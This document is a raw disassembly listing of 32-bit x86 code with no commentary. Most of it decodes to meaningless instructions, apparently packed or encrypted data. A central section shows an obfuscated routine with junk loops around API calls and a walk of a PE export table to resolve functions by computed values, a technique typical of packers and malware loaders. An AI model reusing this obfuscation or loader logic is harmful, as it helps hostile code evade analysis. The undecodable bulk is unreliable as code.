  40cdc3:	(bad)  
  40cdc4:	idiv   DWORD PTR [eax+0x29c6474e]
  40cdca:	add    eax,0xe2de8449
  40cdcf:	retf   
  40cdd0:	cmp    DWORD PTR [eax-0x12],esp
  40cdd3:	(bad)  
  40cdd4:	in     eax,dx
  40cdd5:	xor    eax,0x6b7ab80c
  40cdda:	push   esp
  40cddb:	sbb    ecx,ebp
  40cddd:	mov    ebx,0xf8888d90
  40cde2:	pushf  
  40cde3:	loopne 0x40cdc2
  40cde5:	call   FWORD PTR [edx+0x7d61536f]
  40cdeb:	or     eax,ebp
  40cded:	and    DWORD PTR [esp+eiz*8+0x34d661b0],esp
  40cdf4:	push   edx
  40cdf5:	lds    eax,FWORD PTR [ecx-0x7e8ff547]
  40cdfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdfc:	sti    
  40cdfd:	and    cl,BYTE PTR [edx]
  40cdff:	sub    al,0xf4
  40ce01:	call   0x7d3e:0x8557e579
  40ce08:	xor    al,BYTE PTR [edi+0xa0f79c9]
  40ce0e:	ret    0x6e52
  40ce11:	in     eax,0xcb
  40ce13:	popf   
  40ce14:	mov    dh,0x81
  40ce16:	out    dx,eax
  40ce17:	or     DWORD PTR [edx+ecx*1-0x24f9ae69],ebp
  40ce1e:	lock clc 
  40ce20:	repnz ss cdq 
  40ce23:	fidiv  WORD PTR [edi]
  40ce25:	push   esi
  40ce26:	cmp    bl,BYTE PTR [ebp+0x31]
  40ce29:	pop    eax
  40ce2a:	inc    esp
  40ce2b:	mov    bl,0x63
  40ce2d:	xchg   ebp,eax
  40ce2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce2f:	or     esi,eax
  40ce31:	jecxz  0x40cdee
  40ce33:	sbb    al,0xd
  40ce35:	sbb    al,0xb6
  40ce37:	pop    ecx
  40ce38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce39:	stos   BYTE PTR es:[edi],al
  40ce3a:	je     0x40ce6a
  40ce3c:	mov    BYTE PTR [edi],bl
  40ce3e:	imul   edi,DWORD PTR [eax],0x30
  40ce41:	cmc    
  40ce42:	das    
  40ce43:	jne    0x40ce66
  40ce45:	lahf   
  40ce46:	(bad)  [eax-0x1ed2cd22]
  40ce4c:	(bad)  
  40ce4d:	sub    eax,0xe1b8549
  40ce52:	xchg   DWORD PTR [ebp+eiz*8+0x37],ebp
  40ce56:	xlat   BYTE PTR ds:[ebx]
  40ce57:	cmp    BYTE PTR [ecx+0x28],ch
  40ce5a:	out    dx,al
  40ce5b:	lock ror edx,0x67
  40ce5f:	mov    esi,0x46fee3d5
  40ce64:	mov    ecx,0xbc5c5d98
  40ce69:	fwait
  40ce6a:	cdq    
  40ce6b:	repnz mov eax,eax
  40ce6e:	xor    edx,DWORD PTR [edi]
  40ce70:	loop   0x40ceae
  40ce72:	mov    edx,0x3f74f9d0
  40ce77:	mov    al,ds:0x2b17e4cf
  40ce7c:	xor    eax,0xb12a1d43
  40ce81:	pop    es
  40ce82:	out    0xa2,eax
  40ce84:	xchg   edi,eax
  40ce85:	fild   QWORD PTR [esi]
  40ce87:	cs xchg al,dh
  40ce8a:	in     al,0x31
  40ce8c:	mov    eax,ds:0xce52fbea
  40ce91:	mov    ds:0x38a8dda6,eax
  40ce96:	jp     0x40ce53
  40ce98:	mov    esp,0xc7fc458b
  40ce9d:	add    eax,0x432eab
  40cea2:	push   ds
  40cea3:	add    BYTE PTR [eax],al
  40cea5:	add    BYTE PTR [ebx+0x432eab3d],al
  40ceab:	add    BYTE PTR [eax],al
  40cead:	je     0x40cee0
  40ceb3:	cmp    DWORD PTR ds:0x432eab,0x2d
  40ceba:	ja     0x40cee0
  40cec0:	jmp    0x40cece
  40cec5:	push   DWORD PTR [ebp-0x24]
  40cec8:	call   DWORD PTR ds:0x43fdd3
  40cece:	mov    ebx,DWORD PTR ds:0x432eab
  40ced4:	dec    ebx
  40ced5:	mov    DWORD PTR ds:0x432eab,ebx
  40cedb:	jmp    0x40cea6
  40cee0:	xor    eax,esi
  40cee2:	add    eax,edi
  40cee4:	or     ebx,0x4a81
  40ceea:	mov    DWORD PTR [ebp-0x30],eax
  40ceed:	mov    ebx,DWORD PTR [ebp-0x4]
  40cef0:	or     eax,DWORD PTR ds:0x432e7b
  40cef6:	xor    ebx,esi
  40cef8:	and    DWORD PTR ds:0x432e6b,0x0
  40cf02:	jmp    0x40cf12
  40cf07:	mov    eax,ds:0x432e6b
  40cf0c:	inc    eax
  40cf0d:	mov    ds:0x432e6b,eax
  40cf12:	cmp    DWORD PTR ds:0x432e6b,0x19
  40cf19:	jae    0x40cf59
  40cf1f:	cmp    DWORD PTR ds:0x432e6b,0x8
  40cf26:	jl     0x40cf59
  40cf2c:	jmp    0x40cf3c
  40cf31:	push   0x432189
  40cf36:	call   DWORD PTR ds:0x43fddb
  40cf3c:	cmp    DWORD PTR ds:0x432e6b,0x7
  40cf43:	jne    0x40cf54
  40cf49:	mov    eax,ds:0x432e6b
  40cf4e:	inc    eax
  40cf4f:	mov    ds:0x432e6b,eax
  40cf54:	jmp    0x40cf07
  40cf59:	add    ebx,edi
  40cf5b:	sub    DWORD PTR ds:0x432e8b,ebx
  40cf61:	mov    eax,DWORD PTR [ebp-0x24]
  40cf64:	xor    DWORD PTR ds:0x432ebb,0x518c
  40cf6e:	sub    eax,edi
  40cf70:	lea    ecx,[ebx-0x3272f6]
  40cf76:	xor    eax,esi
  40cf78:	xor    DWORD PTR ds:0x432e67,0x744d
  40cf82:	xor    ecx,esi
  40cf84:	mov    DWORD PTR ds:0x432eb3,0x57aa
  40cf8e:	cmp    ecx,eax
  40cf90:	mov    DWORD PTR ds:0x432e8f,0x2448
  40cf9a:	je     0x40d1fa
  40cfa0:	mov    eax,ds:0x432ebb
  40cfa5:	and    DWORD PTR ds:0x432e2f,eax
  40cfab:	mov    eax,DWORD PTR [ebp-0x4]
  40cfae:	neg    DWORD PTR ds:0x432e73
  40cfb4:	xor    eax,esi
  40cfb6:	inc    DWORD PTR ds:0x432e43
  40cfbc:	add    eax,edi
  40cfbe:	mov    DWORD PTR ds:0x432eab,0x7b11
  40cfc8:	cmp    ebx,eax
  40cfca:	jne    0x40d1d7
  40cfd0:	xor    DWORD PTR ds:0x432e37,0x432e63
  40cfda:	push   DWORD PTR [ebp+0x8]
  40cfdd:	xor    DWORD PTR ds:0x432e83,0x432eaf
  40cfe7:	call   0x421aa4
  40cfec:	or     ecx,DWORD PTR ds:0x432ecb
  40cff2:	mov    DWORD PTR [ebp-0x14],eax
  40cff5:	mov    eax,DWORD PTR [ebp-0x4]
  40cff8:	and    DWORD PTR ds:0x432e97,0x0
  40d002:	mov    ecx,DWORD PTR ds:0x432e97
  40d008:	inc    ecx
  40d009:	mov    DWORD PTR ds:0x432e97,ecx
  40d00f:	cmp    DWORD PTR ds:0x432e97,0x8
  40d016:	jg     0x40d055
  40d01c:	jmp    0x40d02c
  40d021:	push   0x2d20
  40d026:	call   DWORD PTR ds:0x43fddf
  40d02c:	cmp    DWORD PTR ds:0x432e97,0x7
  40d033:	jne    0x40d048
  40d039:	xor    ecx,ecx
  40d03b:	xor    ecx,DWORD PTR ds:0x432e97
  40d041:	inc    ecx
  40d042:	mov    DWORD PTR ds:0x432e97,ecx
  40d048:	cmp    DWORD PTR ds:0x432e97,0x16
  40d04f:	jb     0x40d002
  40d055:	mov    ecx,DWORD PTR [ebp-0x14]
  40d058:	xor    eax,esi
  40d05a:	sbb    DWORD PTR ds:0x432e33,0x7710
  40d064:	add    eax,edi
  40d066:	cmp    ecx,eax
  40d068:	mov    DWORD PTR ds:0x432e93,0x6f23
  40d072:	je     0x40f614
  40d078:	push   DWORD PTR [ebp-0x14]
  40d07b:	xor    DWORD PTR ds:0x432e33,0x5f29
  40d085:	push   DWORD PTR [ebp+0x8]
  40d088:	call   0x423e95
  40d08d:	mov    DWORD PTR [ebp-0x14],eax
  40d090:	mov    eax,DWORD PTR [ebp-0x4]
  40d093:	mov    ecx,DWORD PTR ds:0x432e93
  40d099:	and    DWORD PTR ds:0x432e8b,ecx
  40d09f:	mov    ecx,DWORD PTR [ebp-0x14]
  40d0a2:	neg    DWORD PTR ds:0x432e6b
  40d0a8:	xor    eax,esi
  40d0aa:	sub    DWORD PTR ds:0x432e8b,0x59e8
  40d0b4:	add    eax,edi
  40d0b6:	cmp    ecx,eax
  40d0b8:	je     0x40f614
  40d0be:	and    DWORD PTR ds:0x432e63,0x0
  40d0c8:	jmp    0x40d0da
  40d0cd:	mov    ecx,DWORD PTR ds:0x432e63
  40d0d3:	inc    ecx
  40d0d4:	mov    DWORD PTR ds:0x432e63,ecx
  40d0da:	cmp    DWORD PTR ds:0x432e63,0x14
  40d0e1:	jae    0x40d123
  40d0e7:	cmp    DWORD PTR ds:0x432e63,0xb
  40d0ee:	jbe    0x40d123
  40d0f4:	jmp    0x40d104
  40d0f9:	push   0x4320f7
  40d0fe:	call   DWORD PTR ds:0x43fde3
  40d104:	cmp    DWORD PTR ds:0x432e63,0xa
  40d10b:	jne    0x40d11e
  40d111:	mov    ecx,DWORD PTR ds:0x432e63
  40d117:	inc    ecx
  40d118:	mov    DWORD PTR ds:0x432e63,ecx
  40d11e:	jmp    0x40d0cd
  40d123:	mov    eax,DWORD PTR [ebp-0x14]
  40d126:	mov    eax,DWORD PTR [eax+0x18]
  40d129:	mov    DWORD PTR [ebp-0x24],eax
  40d12c:	or     ecx,0x560
  40d132:	mov    eax,DWORD PTR [ebp-0x14]
  40d135:	adc    ecx,DWORD PTR ds:0x432e9f
  40d13b:	mov    ecx,DWORD PTR [ebp+0x8]
  40d13e:	add    ecx,DWORD PTR [eax+0x20]
  40d141:	xor    eax,eax
  40d143:	xor    eax,DWORD PTR ds:0x432e7b
  40d149:	sbb    eax,DWORD PTR ds:0x432e67
  40d14f:	mov    ds:0x432e7b,eax
  40d154:	mov    DWORD PTR [ebp-0x2c],ecx
  40d157:	dec    ecx
  40d158:	mov    eax,DWORD PTR [ebp-0x14]
  40d15b:	add    ecx,0x1e8d
  40d161:	mov    ecx,DWORD PTR [ebp+0x8]
  40d164:	add    ecx,DWORD PTR [eax+0x24]
  40d167:	and    DWORD PTR ds:0x432e3b,0x0
  40d171:	mov    eax,ds:0x432e3b
  40d176:	inc    eax
  40d177:	mov    ds:0x432e3b,eax
  40d17c:	cmp    DWORD PTR ds:0x432e3b,0x2c
  40d183:	ja     0x40d1a4
  40d189:	jmp    0x40d197
  40d18e:	push   DWORD PTR [ebp-0x14]
  40d191:	call   DWORD PTR ds:0x43fde7
  40d197:	cmp    DWORD PTR ds:0x432e3b,0x1f
  40d19e:	jb     0x40d171
  40d1a4:	mov    DWORD PTR [ebp-0x34],ecx
  40d1a7:	mov    eax,ds:0x432e3b
  40d1ac:	and    DWORD PTR ds:0x432e87,eax
  40d1b2:	mov    eax,DWORD PTR [ebp-0x14]
  40d1b5:	xor    DWORD PTR ds:0x432e73,0x264d
  40d1bf:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1c2:	add    ecx,DWORD PTR [eax+0x1c]
  40d1c5:	mov    DWORD PTR ds:0x432e57,0x2595
  40d1cf:	mov    DWORD PTR [ebp-0x14],ecx
  40d1d2:	jmp    0x40f5dc
  40d1d7:	mov    eax,DWORD PTR [ebp-0x2c]
  40d1da:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1dd:	add    ecx,DWORD PTR [eax+ebx*4]
  40d1e0:	mov    DWORD PTR [ebp-0x28],ecx
  40d1e3:	mov    eax,DWORD PTR [ebp-0x4]
  40d1e6:	mov    ecx,DWORD PTR [ebp-0x28]
  40d1e9:	xor    eax,esi
  40d1eb:	add    eax,edi
  40d1ed:	cmp    ecx,eax
  40d1ef:	je     0x40f5dc
  40d1f5:	jmp    0x40f5cd
  40d1fa:	mov    eax,DWORD PTR [ebp-0x4]
  40d1fd:	mov    ecx,DWORD PTR [ebp-0x8]
  40d200:	xor    eax,esi
  40d202:	add    eax,edi
  40d204:	jmp    0x40f5b3
  40d209:	jns    0x40d251
  40d20b:	mov    esp,0x14898cd9
  40d210:	(bad)  
  40d211:	mov    es,WORD PTR [eax-0x1b6feead]
  40d217:	or     bh,BYTE PTR [edx]
  40d219:	push   ebp
  40d21a:	rol    BYTE PTR [ebx-0x7c9f0e7d],cl
  40d220:	adc    eax,0xffffffd9
  40d223:	inc    esp
  40d224:	cld    
  40d225:	ss fs mov dh,0xa0
  40d229:	out    0x71,eax
  40d22b:	xchg   DWORD PTR [edx],ecx
  40d22d:	xor    BYTE PTR [eax],ch
  40d22f:	jb     0x40d1d4
  40d231:	lods   al,BYTE PTR ds:[esi]
  40d232:	xor    BYTE PTR [ecx+0x1cf23b1b],al
  40d238:	icebp  
  40d239:	xchg   edx,eax
  40d23a:	jns    0x40d248
  40d23c:	push   ebx
  40d23d:	push   eax
  40d23e:	outs   dx,DWORD PTR ds:[esi]
  40d23f:	dec    eax
  40d240:	push   0x44
  40d242:	xlat   BYTE PTR ds:[ebx]
  40d243:	and    esi,ebx
  40d245:	mov    DWORD PTR [ecx+0x24],ecx
  40d248:	add    BYTE PTR [edx+0x23],bh
  40d24b:	ret    
  40d24c:	pop    eax
  40d24d:	cli    
  40d24e:	push   edi
  40d24f:	jmp    0xcfb4:0x924844fe
  40d256:	(bad)  
  40d257:	div    DWORD PTR [edx]
  40d259:	push   esi
  40d25a:	pop    edi
  40d25b:	popf   
  40d25c:	jnp    0x40d2db
  40d25e:	int3   
  40d25f:	addr16 dec esp
  40d261:	call   0xa402be06
  40d266:	cmp    BYTE PTR [esp+ebx*4-0x25ffccc8],dh
  40d26d:	das    
  40d26e:	call   0x221a:0x7caacb69
  40d275:	pusha  
  40d276:	push   edi
  40d277:	cli    
  40d278:	pop    ss
  40d279:	idiv   DWORD PTR [eax+0x70]
  40d27c:	neg    BYTE PTR [ebx-0x52]
  40d27f:	in     eax,dx
  40d280:	imul   edi,DWORD PTR [esi+0x41],0x1d9e43f
  40d287:	into   
  40d288:	aaa    
  40d289:	stos   BYTE PTR es:[edi],al
  40d28a:	fidivr DWORD PTR [ebx+0x67d1b80c]
  40d290:	mov    ah,0x62
  40d292:	jno    0x40d23a
  40d294:	in     eax,dx
  40d295:	fucomip st,st(2)
  40d297:	push   0xed161fa1
  40d29c:	jl     0x40d235
  40d29e:	mov    bh,0xd9
  40d2a0:	mov    WORD PTR [esi-0x19],ds
  40d2a3:	mov    bl,BYTE PTR [esi-0x49]
  40d2a6:	pop    ds
  40d2a7:	jecxz  0x40d273
  40d2a9:	push   esp
  40d2aa:	(bad)
  40d2ae:	or     bl,BYTE PTR ds:0xf0a44dec
  40d2b4:	repnz mov ss,ebp
  40d2b7:	nop
  40d2b8:	pop    ebp
  40d2b9:	leave  
  40d2ba:	stc    
  40d2bb:	loope  0x40d27d
  40d2bd:	xchg   ebp,eax
  40d2be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2bf:	xchg   ebp,eax
  40d2c0:	sti    
  40d2c1:	popf   
  40d2c2:	mov    ah,0xe7
  40d2c4:	stos   BYTE PTR es:[edi],al
  40d2c5:	xchg   esi,eax
  40d2c6:	(bad)  
  40d2c8:	fcom   QWORD PTR [ebp*2+0x29054b73]
  40d2cf:	xlat   BYTE PTR ds:[ebx]
  40d2d0:	in     eax,dx
  40d2d1:	and    BYTE PTR [esi],dh
  40d2d3:	sbb    eax,0x2638de07
  40d2d8:	ficomp WORD PTR ds:0x3539a310
  40d2de:	pushf  
  40d2df:	leave  
  40d2e0:	inc    ecx
  40d2e1:	mov    dh,0x1
  40d2e3:	mov    eax,ds:0xd9dd2c7c
  40d2e8:	or     BYTE PTR [ebp+edi*2-0x35],0xc9
  40d2ed:	rol    bl,0xa0
  40d2f0:	les    ecx,FWORD PTR ds:0xcf212c94
  40d2f6:	mov    gs,WORD PTR [ecx+0x7e]
  40d2f9:	fidivr WORD PTR [ecx+edx*1+0x6e5c39e1]
  40d300:	dec    edx
  40d301:	lds    ebp,FWORD PTR [edi]
  40d303:	and    BYTE PTR [ecx+0x67],bh
  40d306:	adc    DWORD PTR [ebp+0x5f],edx
  40d309:	dec    eax
  40d30a:	hlt    
  40d30b:	and    cx,WORD PTR [ebx+0x290e07f7]
  40d312:	imul   ebx,esi,0xc97685e0
  40d318:	mov    cl,0x86
  40d31a:	push   0xffffff83
  40d31c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d31d:	and    ebp,ecx
  40d31f:	cwde   
  40d320:	jns    0x40d2f6
  40d322:	je     0x40d33c
  40d324:	mov    ?,WORD PTR [edi]
  40d326:	cwde   
  40d327:	adc    al,cl
  40d329:	sbb    esp,eax
  40d32b:	imul   esi,DWORD PTR [ecx-0x648722ad],0x48
  40d332:	sbb    BYTE PTR [ebx-0x76a4d062],0xa1
  40d339:	jo     0x40d358
  40d33b:	pusha  
  40d33c:	xchg   BYTE PTR [esi],ch
  40d33e:	clc    
  40d33f:	adc    edx,DWORD PTR [ebx+0x5f]
  40d342:	xor    esi,esi
  40d344:	dec    eax
  40d345:	sar    DWORD PTR [edx-0x2c807ecb],cl
  40d34b:	aam    0xae
  40d34d:	or     ebp,esi
  40d34f:	mov    ebx,0x8e742ad
  40d354:	fisttp DWORD PTR [edi]
  40d356:	xor    ebp,DWORD PTR [edi-0x5c894fc2]
  40d35c:	aaa    
  40d35d:	dec    esp
  40d35e:	lock pop edx
  40d360:	sbb    al,0x2e
  40d362:	rol    BYTE PTR [esi],cl
  40d364:	or     BYTE PTR ds:0x79fec9e0,bl
  40d36a:	in     al,0x73
  40d36c:	mov    ebp,0xd28e791e
  40d371:	add    eax,0x95bd60ad
  40d376:	daa    
  40d377:	jb     0x40d332
  40d379:	bound  ebx,QWORD PTR [edx-0x593e0bd2]
  40d37f:	fbld   TBYTE PTR [ebx-0x609e99c3]
  40d385:	bound  esi,QWORD PTR [ecx+0x44]
  40d388:	inc    esi
  40d389:	push   es
  40d38a:	sbb    esp,DWORD PTR [ecx]
  40d38c:	mov    DWORD PTR [ecx*1-0x6b0f4fe2],ebp
  40d393:	pop    esp
  40d394:	xor    al,0x3e
  40d396:	mov    edi,0xea43b87f
  40d39b:	cmp    dh,BYTE PTR [edi-0x23f4856f]
  40d3a1:	int3   
  40d3a2:	add    BYTE PTR [ecx-0x79d57b4b],al
  40d3a8:	mov    eax,0xdebdd325
  40d3ad:	mov    ch,0x49
  40d3af:	stos   BYTE PTR es:[edi],al
  40d3b0:	jo     0x40d40c
  40d3b2:	fnsave [ebp-0xf]
  40d3b5:	and    dl,al
  40d3b7:	push   cs
  40d3b8:	and    dl,bl
  40d3ba:	inc    eax
  40d3bb:	pusha  
  40d3bc:	pop    edx
  40d3bd:	sub    DWORD PTR [ecx+ecx*4],ebx
  40d3c0:	add    DWORD PTR [esi-0x348a9a83],ebp
  40d3c6:	rol    eax,cl
  40d3c8:	cli    
  40d3c9:	mov    esp,0xa6c0e0c6
  40d3ce:	lods   al,BYTE PTR ds:[esi]
  40d3cf:	retf   
  40d3d0:	mov    edi,0x35317ea0
  40d3d5:	mov    ds:0xc04ac9c7,eax
  40d3da:	add    DWORD PTR [eax],edx
  40d3dc:	sbb    ah,ah
  40d3de:	(bad)  
  40d3df:	out    0x4a,al
  40d3e1:	or     DWORD PTR [ebx-0x61677714],edi
  40d3e7:	sub    bl,BYTE PTR [ebp-0x43d8cf69]
  40d3ed:	jle    0x40d428
  40d3ef:	add    eax,DWORD PTR [ebp+0x27]
  40d3f2:	inc    ebx
  40d3f3:	inc    ebx
  40d3f4:	call   0xdea9:0xd09e20d1
  40d3fb:	(bad)  
  40d3fc:	cli    
  40d3fd:	sahf   
  40d3fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3ff:	popa   
  40d400:	out    0x30,eax
  40d402:	mov    ebx,0xb8249d2e
  40d407:	sbb    edi,ebx
  40d409:	retf   0x349c
  40d40c:	push   bx
  40d40e:	jnp    0x40d409
  40d410:	gs mov ebx,eax
  40d413:	fcmovb st,st(2)
  40d415:	outs   dx,BYTE PTR ds:[esi]
  40d416:	(bad)  
  40d417:	cld    
  40d418:	inc    edx
  40d419:	in     al,0xb1
  40d41b:	adc    edx,DWORD PTR [ebx-0x17]
  40d41e:	imul   ecx,edi,0x12b60178
  40d424:	sti    
  40d425:	inc    edi
  40d426:	test   DWORD PTR [ecx-0x77],edx
  40d429:	int    0x85
  40d42b:	int3   
  40d42c:	repnz fistp WORD PTR [eax]
  40d42f:	mov    ?,WORD PTR [ecx-0x6f]
  40d432:	cld    
  40d433:	inc    edx
  40d434:	and    ebx,DWORD PTR [ebp+0x2adda483]
  40d43a:	repnz int3 
  40d43c:	in     al,dx
  40d43d:	xor    DWORD PTR [eax+0x6],esp
  40d440:	jb     0x40d425
  40d442:	dec    esp
  40d443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d444:	loope  0x40d3f4
  40d446:	out    0x9b,eax
  40d448:	push   es
  40d449:	add    al,0x41
  40d44b:	mov    eax,edx
  40d44d:	jno    0x40d4bb
  40d44f:	inc    ecx
  40d450:	fidiv  WORD PTR [ebx+0x5d]
  40d453:	pop    ebp
  40d454:	aam    0x9a
  40d456:	push   ss
  40d457:	xor    al,0x83
  40d459:	xchg   ah,bh
  40d45b:	xchg   esi,eax
  40d45c:	pop    esi
  40d45d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d45e:	add    al,0x40
  40d460:	lds    eax,FWORD PTR [ebx+eiz*4-0x6487d65d]
  40d467:	sub    bl,BYTE PTR [edi]
  40d469:	xchg   esp,eax
  40d46a:	jle    0x40d40d
  40d46c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d46d:	pop    edx
  40d46e:	add    ch,al
  40d470:	mov    bh,0xa1
  40d472:	idiv   BYTE PTR [edx-0x72]
  40d475:	or     esi,DWORD PTR [esi+ebp*1-0x6b]
  40d479:	sbb    ecx,esi
  40d47b:	mov    ebx,0x128919b5
  40d480:	(bad)  
  40d481:	out    0xdd,eax
  40d483:	bound  eax,QWORD PTR [ecx+edi*1]
  40d486:	inc    edi
  40d487:	aad    0xd
  40d489:	adc    al,0x93
  40d48b:	xor    edx,DWORD PTR [eax-0x56]
  40d48e:	mov    ds:0x3e102c80,eax
  40d493:	dec    esi
  40d494:	mov    bl,0xb3
  40d496:	shl    ah,cl
  40d498:	retf   0x847e
  40d49b:	jne    0x40d443
  40d49d:	sti    
  40d49e:	daa    
  40d49f:	outs   dx,DWORD PTR ds:[esi]
  40d4a0:	fdiv   st,st(6)
  40d4a2:	push   eax
  40d4a3:	pop    edi
  40d4a4:	das    
  40d4a5:	iret   
  40d4a6:	xchg   esi,eax
  40d4a7:	jle    0x40d431
  40d4a9:	fs cld 
  40d4ab:	mov    bh,0x66
  40d4ad:	pop    esp
  40d4ae:	push   ebp
  40d4af:	xchg   edi,eax
  40d4b0:	lods   al,BYTE PTR ds:[esi]
  40d4b1:	jbe    0x40d4ab
  40d4b3:	data16 sahf 
  40d4b5:	add    BYTE PTR [ebx],0xfc
  40d4b8:	push   edx
  40d4b9:	mov    ch,0x95
  40d4bb:	mov    ebx,0x5ce4d568
  40d4c0:	pop    es
  40d4c1:	mov    edi,0x9f6132a
  40d4c6:	clc    
  40d4c7:	fmul   QWORD PTR [edx+edx*8+0x52]
  40d4cb:	pop    edx
  40d4cc:	fstp   TBYTE PTR [ebp-0x5ebc2203]
  40d4d2:	enter  0x2d91,0x5c
  40d4d6:	in     al,0x18
  40d4d8:	fnstenv [edi]
  40d4da:	and    DWORD PTR [ebp-0xf0d6cac],eax
  40d4e0:	dec    edi
  40d4e1:	shr    DWORD PTR [ebx-0x40dacdfa],1
  40d4e7:	add    BYTE PTR [eax+0x34],0xb4
  40d4eb:	mov    dh,0xd
  40d4ed:	lods   eax,DWORD PTR ds:[esi]
  40d4ee:	in     al,0xa3
  40d4f0:	sub    esi,DWORD PTR [ebx+0x1d88269a]
  40d4f6:	cmp    al,0xa
  40d4f8:	or     ebp,DWORD PTR [esi+esi*1-0x70c750f5]
  40d4ff:	in     al,dx
  40d500:	mov    dl,0x1d
  40d502:	jmp    0xc367b6ac
  40d507:	add    eax,0xedae8d32
  40d50c:	out    0xda,al
  40d50e:	mov    ds:0x621c7848,eax
  40d513:	lahf   
  40d514:	pop    esi
  40d515:	ss hlt 
  40d517:	push   0xc
  40d519:	cwde   
  40d51a:	jno    0x40d567
  40d51c:	repnz lea edi,es:[edi+0x27]
  40d521:	mul    esp
  40d523:	add    eax,DWORD PTR [ecx-0xb6d6fca]
  40d529:	lods   al,BYTE PTR ds:[esi]
  40d52a:	cmp    al,0x7e
  40d52c:	addr16 mov edx,0x4ea6c511
  40d532:	push   eax
  40d533:	pop    esp
  40d534:	xor    BYTE PTR ds:0xa0f80365,bh
  40d53a:	jno    0x40d503
  40d53c:	xchg   esp,eax
  40d53e:	or     ah,bl
  40d540:	push   esi
  40d541:	sar    BYTE PTR [edx-0x16049532],cl
  40d547:	mov    dh,0xe2
  40d549:	js     0x40d5a0
  40d54b:	jb     0x40d4f2
  40d54d:	out    0x80,eax
  40d54f:	jmp    0xa7c8:0x735c113d
  40d556:	jns    0x40d546
  40d558:	sahf   
  40d559:	int3   
  40d55a:	ja     0x40d595
  40d55c:	in     al,dx
  40d55d:	cs aam 0xaa
  40d560:	into   
  40d561:	xor    al,0x4a
  40d563:	xchg   edi,eax
  40d564:	imul   edi,edi,0x57
  40d567:	inc    ecx
  40d568:	xor    eax,ecx
  40d56a:	xor    edi,DWORD PTR [edx+0x7b]
  40d56d:	sbb    BYTE PTR [edi],ch
  40d56f:	dec    eax
  40d570:	add    DWORD PTR ds:0xd5a5ce26,0x5ba67c9e
  40d57a:	xchg   ebx,eax
  40d57b:	cmc    
  40d57c:	xor    DWORD PTR [edi-0x78],edi
  40d57f:	stos   BYTE PTR es:[edi],al
  40d580:	ja     0x40d5a6
  40d582:	call   0xf705:0x9bfdb25
  40d589:	je     0x40d59c
  40d58b:	mov    edi,0xa3daa393
  40d590:	mov    bl,0x9
  40d592:	push   ebx
  40d593:	push   edx
  40d594:	xchg   ch,bl
  40d596:	(bad)  
  40d598:	adc    al,0xc6
  40d59a:	stos   BYTE PTR es:[edi],al
  40d59b:	lds    eax,FWORD PTR [edx-0x76]
  40d59e:	aaa    
  40d59f:	jmp    0x98ed:0xab82e283
  40d5a6:	mov    dh,0x83
  40d5a8:	mov    ebp,edx
  40d5aa:	hlt    
  40d5ab:	push   ebp
  40d5ac:	mov    ds:0x49dd51f3,eax
  40d5b1:	jo     0x40d5d4
  40d5b3:	push   0x6e
  40d5b5:	push   ds
  40d5b6:	add    DWORD PTR [eax+0x40],esi
  40d5b9:	pop    ecx
  40d5ba:	lahf   
  40d5bb:	mov    ch,0x83
  40d5bd:	mov    dl,0xb0
  40d5bf:	push   ebx
  40d5c0:	icebp  
  40d5c1:	add    bh,cl
  40d5c3:	fst    QWORD PTR [eax+esi*1-0x42]
  40d5c7:	(bad)  
  40d5c8:	jno    0x40d63b
  40d5ca:	xchg   ebx,eax
  40d5cb:	jl     0x40d575
  40d5cd:	addr16 dec edi
  40d5cf:	fldcw  WORD PTR ds:0x998d2402
  40d5d5:	fwait
  40d5d6:	sar    DWORD PTR [esi+0x565cd373],1
  40d5dc:	out    0x82,al
  40d5de:	ins    DWORD PTR es:[edi],dx
  40d5df:	dec    eax
  40d5e0:	cs fxch st(0)
  40d5e3:	and    ebp,DWORD PTR [eax+edi*1+0x9]
  40d5e7:	add    ch,BYTE PTR [ebx+0x589a3883]
  40d5ed:	sub    bh,BYTE PTR [edx-0x3b1e8404]
  40d5f3:	aad    0x63
  40d5f5:	xor    DWORD PTR [ecx],edx
  40d5f7:	push   edx
  40d5f8:	cmp    bl,BYTE PTR [ebx]
  40d5fa:	inc    edi
  40d5fb:	mov    dh,ch
  40d5fd:	mov    al,BYTE PTR [eax+0x3ca20741]
  40d603:	xchg   ecx,eax
  40d604:	sbb    dl,dh
  40d606:	fiadd  DWORD PTR [ecx]
  40d608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d609:	cmp    ecx,DWORD PTR [ebx-0x6d]
  40d60c:	mov    es,WORD PTR [esi+esi*4-0x54]
  40d610:	mov    bh,0xaa
  40d612:	add    cl,dh
  40d614:	push   ds
  40d615:	adc    edi,ebx
  40d617:	add    DWORD PTR [edx],ebx
  40d619:	fild   DWORD PTR [edi+ebx*1-0x10]
  40d61d:	repz jl 0x40d641
  40d620:	pop    ebp
  40d621:	(bad)  
  40d623:	mov    ebx,0xf1d476a8
  40d628:	mov    ecx,edx
  40d62a:	pushf  
  40d62b:	push   edi
  40d62c:	sub    al,BYTE PTR [eax]
  40d62e:	shl    BYTE PTR [esi+0x35],1
  40d631:	js     0x40d601
  40d633:	mov    ebp,0x33c5871
  40d638:	mov    WORD PTR [edx+0x61],es
  40d63b:	iret   
  40d63c:	adc    al,0x73
  40d63e:	sti    
  40d63f:	test   BYTE PTR [eax-0x4891bab0],bl
  40d645:	dec    eax
  40d646:	mov    ecx,0x5df2fe30
  40d64b:	jns    0x40d617
  40d64d:	jo     0x40d63b
  40d64f:	dec    edi
  40d650:	mov    cl,0x9f
  40d652:	punpckldq mm6,DWORD PTR ds:0xf7109b30
  40d659:	or     al,BYTE PTR [eax+ebx*1]
  40d65c:	repnz lods al,BYTE PTR ds:[esi]
  40d65e:	pop    edx
  40d65f:	pop    eax
  40d660:	pop    ds
  40d661:	mov    al,ds:0xc860ccd1
  40d666:	js     0x40d6db
  40d668:	sti    
  40d669:	push   cs
  40d66a:	loopne 0x40d615
  40d66c:	fs hlt 
